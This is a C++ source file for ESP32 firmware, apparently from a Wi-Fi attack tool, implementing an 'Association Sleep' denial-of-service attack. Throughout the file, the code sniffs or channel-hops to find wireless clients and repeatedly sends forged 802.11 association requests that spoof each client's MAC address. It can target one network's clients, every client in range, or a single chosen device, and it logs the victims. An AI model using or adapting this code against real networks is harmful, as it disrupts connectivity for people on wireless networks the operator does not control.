#include "AssociationSleeper.h"
#include "App.h"
#include "ConfigManager.h"
#include "Logger.h"
#include <esp_wifi.h>
#include "Config.h"

AssociationSleeper* AssociationSleeper::instance_ = nullptr;

AssociationSleeper::AssociationSleeper() : 
    app_(nullptr),
    stationSniffer_(nullptr),
    isActive_(false),
    packetCounter_(0),
    lastTargetedPacketTime_(0),
    currentClientIndex_(0),
    state_(State::SNIFFING),
    channelHopIndex_(0),
    lastChannelHopTime_(0)
{
    instance_ = this;
}

void AssociationSleeper::setup(App* app) {
    app_ = app;
    stationSniffer_ = &app->getStationSniffer();
}

bool AssociationSleeper::start(const WifiNetworkInfo& ap) {
    if (isActive_) stop();
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting NORMAL Association Sleep attack on %s", ap.ssid);

    // <-- FIX: Use new enum and member variable
    attackType_ = AttackType::NORMAL;
    targetAp_ = ap;
    isActive_ = true;
    state_ = State::SNIFFING;
    packetCounter_ = 0;
    currentClientIndex_ = 0;

    if (!stationSniffer_->start(targetAp_)) {
        LOG(LogLevel::ERROR, "ASSOC_SLEEP", "Failed to start station sniffer.");
        isActive_ = false;
        return false;
    }
    
    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

bool AssociationSleeper::start() {
    if (isActive_) stop();
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting BROADCAST Association Sleep attack.");

    // <-- FIX: Use new enum and member variable
    attackType_ = AttackType::BROADCAST;
    isActive_ = true;
    packetCounter_ = 0;
    
    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "ASSOC_SLEEP", "Failed to acquire RF lock for broadcast.");
        isActive_ = false;
        return false;
    }

    newClientsFound_.clear();
    recentlyAttacked_.clear();
    channelHopIndex_ = 0;
    esp_wifi_set_promiscuous_rx_cb(&packetHandlerCallback);
    esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
    lastChannelHopTime_ = millis();

    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

// <-- NEW: Implementation for Pinpoint Client attack ---
bool AssociationSleeper::start(const StationInfo& client) {
    if (isActive_) stop();
    char macStr[18];
    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Starting PINPOINT Association Sleep attack on %s", macStr);

    attackType_ = AttackType::PINPOINT_CLIENT;
    pinpointTarget_ = client;
    targetAp_.channel = client.channel; // Store the channel for packet sending
    memcpy(targetAp_.bssid, client.ap_bssid, 6);

    rfLock_ = app_->getHardwareManager().requestRfControl(RfClient::WIFI_PROMISCUOUS);
    if (!rfLock_ || !rfLock_->isValid()) {
        LOG(LogLevel::ERROR, "ASSOC_SLEEP", "Failed to acquire RF lock for pinpoint.");
        return false;
    }
    
    isActive_ = true;
    packetCounter_ = 0;
    app_->getHardwareManager().setPerformanceMode(true);
    return true;
}

void AssociationSleeper::stop() {
    if (!isActive_) return;
    LOG(LogLevel::INFO, "ASSOC_SLEEP", "Stopping Association Sleep attack.");
    isActive_ = false;
    // <-- FIX: Use new enum
    if (attackType_ == AttackType::NORMAL) {
        stationSniffer_->stop();
    }
    rfLock_.reset();
    app_->getHardwareManager().setPerformanceMode(false);
}

void AssociationSleeper::loop() {
    if (!isActive_) return;

    // <-- FIX: Use new enum and add new case
    switch(attackType_) {
        case AttackType::NORMAL:
            if (state_ == State::SNIFFING && stationSniffer_->getFoundStations().size() > 0) {
                LOG(LogLevel::INFO, "ASSOC_SLEEP", "Clients found, starting targeted attack phase.");
                state_ = State::ATTACKING;
            }
            if (state_ == State::ATTACKING) {
                const auto& clients = stationSniffer_->getFoundStations();
                if (clients.empty()) return;

                if (millis() - lastTargetedPacketTime_ > 200) { 
                    lastTargetedPacketTime_ = millis();
                    if (currentClientIndex_ >= (int)clients.size()) {
                        currentClientIndex_ = 0;
                    }
                    sendSleepPacket(clients[currentClientIndex_]);
                    currentClientIndex_++;
                }
            }
            break;

        case AttackType::BROADCAST:
            if (millis() - lastChannelHopTime_ > app_->getConfigManager().getSettings().channelHopDelayMs) {
                lastChannelHopTime_ = millis();
                channelHopIndex_ = (channelHopIndex_ + 1) % Channels::WIFI_2_4GHZ_COUNT;
                esp_wifi_set_channel(Channels::WIFI_2_4GHZ[channelHopIndex_], WIFI_SECOND_CHAN_NONE);
            }
            if (!newClientsFound_.empty()) {
                for (const auto& client : newClientsFound_) {
                    char macStr[18];
                    sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", client.mac[0], client.mac[1], client.mac[2], client.mac[3], client.mac[4], client.mac[5]);
                    if (recentlyAttacked_.find(macStr) == recentlyAttacked_.end() || millis() - recentlyAttacked_[macStr] > app_->getConfigManager().getSettings().attackCooldownMs) {
                        LOG(LogLevel::INFO, "ASSOC_SLEEP", "Broadcast: Attacking new client %s on channel %d", macStr, client.channel);
                        sendSleepPacket(client);
                        recentlyAttacked_[macStr] = millis();
                    }
                }
                newClientsFound_.clear();
            }
            break;
            
        case AttackType::PINPOINT_CLIENT:
            if (millis() - lastTargetedPacketTime_ > 200) {
                lastTargetedPacketTime_ = millis();
                sendSleepPacket(pinpointTarget_);
            }
            break;
    }
}

void AssociationSleeper::packetHandlerCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (instance_ && (type == WIFI_PKT_MGMT || type == WIFI_PKT_DATA)) {
        instance_->handlePacket(static_cast<wifi_promiscuous_pkt_t*>(buf));
    }
}

void AssociationSleeper::handlePacket(wifi_promiscuous_pkt_t *packet) {
    // This packet handler is ONLY for BROADCAST mode.
    if (attackType_ != AttackType::BROADCAST) return;

    const uint8_t *payload = packet->payload;
    const uint16_t frame_control = payload[0] | (payload[1] << 8);
    const bool to_ds = (frame_control >> 8) & 0x01;
    const bool from_ds = (frame_control >> 9) & 0x01;
    const uint8_t *bssid = nullptr;
    const uint8_t *client_mac = nullptr;

    if (!to_ds && from_ds) {
        bssid = payload + 10; client_mac = payload + 4;
    } else if (to_ds && !from_ds) {
        bssid = payload + 4; client_mac = payload + 10;
    } else {
        return;
    }
    
    if (client_mac[0] & 0x01) return;

    StationInfo newStation;
    memcpy(newStation.mac, client_mac, 6);
    
    bool alreadyQueued = false;
    for (const auto& st : newClientsFound_) {
        if (st == newStation) {
            alreadyQueued = true;
            break;
        }
    }

    if (!alreadyQueued) {
        memcpy(newStation.ap_bssid, bssid, 6);
        newStation.channel = packet->rx_ctrl.channel;
        newClientsFound_.push_back(newStation);

        // --- NEW LOGGING ---
        // Log the discovery of a new client in broadcast mode.
        // We log the client MAC and the BSSID of the AP it's connected to.
        char clientMacStr[18];
        char bssidStr[18];
        sprintf(clientMacStr, "%02X:%02X:%02X:%02X:%02X:%02X", client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5]);
        sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        LOG(LogLevel::INFO, "ASSOC_SLEEP", "Broadcast: Found station %s -> BSSID %s", clientMacStr, bssidStr);
        // --- END OF NEW LOGGING ---
    }
}

void AssociationSleeper::sendSleepPacket(const StationInfo& client) {
    esp_wifi_set_channel(client.channel, WIFI_SECOND_CHAN_NONE);
    
    // --- THIS IS THE CORRECT IMPLEMENTATION ---
    // 1. Create a local, mutable copy from the centralized template.
    //    We need a copy because we're going to modify it with the client/AP MAC addresses.
    uint8_t association_packet[sizeof(RawFrames::Mgmt::AssociationRequest::TEMPLATE)];
    memcpy(association_packet, RawFrames::Mgmt::AssociationRequest::TEMPLATE, sizeof(RawFrames::Mgmt::AssociationRequest::TEMPLATE));

    // 2. Modify the local copy with dynamic data.
    association_packet[0] = 0x00; association_packet[1] = 0x01; // Set frame type to Association Request
    memcpy(&association_packet[4], client.ap_bssid, 6);   // Destination Address (AP)
    memcpy(&association_packet[10], client.mac, 6);       // Source Address (Client)
    memcpy(&association_packet[16], client.ap_bssid, 6);  // BSSID (AP)
    association_packet[24] = 0x31; association_packet[25] = 0x04; // Capability Info

    // 3. Send the modified local copy.
    esp_wifi_80211_tx(WIFI_IF_STA, association_packet, sizeof(association_packet), false);
    packetCounter_++;
}

bool AssociationSleeper::isActive() const { return isActive_; }
uint32_t AssociationSleeper::getPacketCount() const { return packetCounter_; }
std::string AssociationSleeper::getTargetSsid() const { return std::string(targetAp_.ssid); }

int AssociationSleeper::getClientCount() const { 
    // <-- FIX: Handle all attack types
    switch(attackType_) {
        case AttackType::NORMAL:
            return stationSniffer_->getFoundStations().size();
        case AttackType::BROADCAST:
            return recentlyAttacked_.size();
        case AttackType::PINPOINT_CLIENT:
            return isActive_ ? 1 : 0;
        default:
            return 0;
    }
}
bool AssociationSleeper::isSniffing() const { return state_ == State::SNIFFING; }

// <-- FIX: Correct the function signature and return value ---
AssociationSleeper::AttackType AssociationSleeper::getAttackType() const { return attackType_; }